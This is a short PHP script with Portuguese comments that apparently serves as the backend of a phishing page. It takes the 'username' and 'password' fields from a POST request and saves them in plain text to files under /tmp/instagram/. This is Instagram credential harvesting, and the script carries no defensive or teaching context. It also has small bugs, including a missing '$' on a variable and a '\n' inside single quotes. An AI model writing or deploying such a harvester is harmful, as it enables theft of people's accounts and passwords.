<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // cria arquivo no servidor
    $arquivo = fopen('/tmp/instagram/account'. username .'.txt','w');
    $texto = 'usuario: '. $username .'\n senha: '. $password; 
    fwrite($arquivo, $texto);
    fclose($arquivo);
?>